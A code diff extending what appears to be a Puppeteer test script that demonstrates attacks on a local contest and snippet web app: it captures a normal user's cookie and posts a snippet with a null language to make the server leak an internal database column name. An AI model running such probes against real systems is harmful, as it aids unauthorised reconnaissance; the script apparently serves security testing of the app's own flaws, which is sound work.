@@ -129,7 +129,7 @@ const userBrowser = await puppeteer.launch({
 });
 const userPage = await userBrowser.newPage();
 console.log('Log in as a normal user');
-await login(userPage);
+const userCookie = await login(userPage);
 
 // as normal user, access future contest
 {
@@ -140,6 +140,40 @@ await login(userPage);
   console.log(
     'If the attack is successful, there will be a screenshot called future-contest.jpg with the content of the future contest'
   );
+}
+
+// as a normal user, create a snippet with null language leading to exposing an internal column name
+{
+  const body = JSON.stringify({
+    language: null,
+    snip: 'a'
+  });
+
+  console.log('Exposing a database column name attack');
+  const res = await fetch('http://127.0.0.1:2005/snippets', {
+    credentials: 'include',
+    headers: {
+      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
+      Accept: 'application/json, text/plain, */*',
+      'Accept-Language': 'en-US,en;q=0.5',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Mode': 'no-cors',
+      'Sec-Fetch-Site': 'same-origin',
+      'Content-Type': 'application/json;charset=utf-8',
+      Pragma: 'no-cache',
+      'Cache-Control': 'no-cache',
+      Cookie: userCookie
+    },
+    referrer: 'http://127.0.0.1:2005/snippets',
+    body,
+    method: 'POST',
+    mode: 'cors'
+  });
+
+  console.log(
+    'If the attack is successful, the following message will reveal an internal database column:'
+  );
+  console.log(await res.text());
 }
 
 await userPage.close();
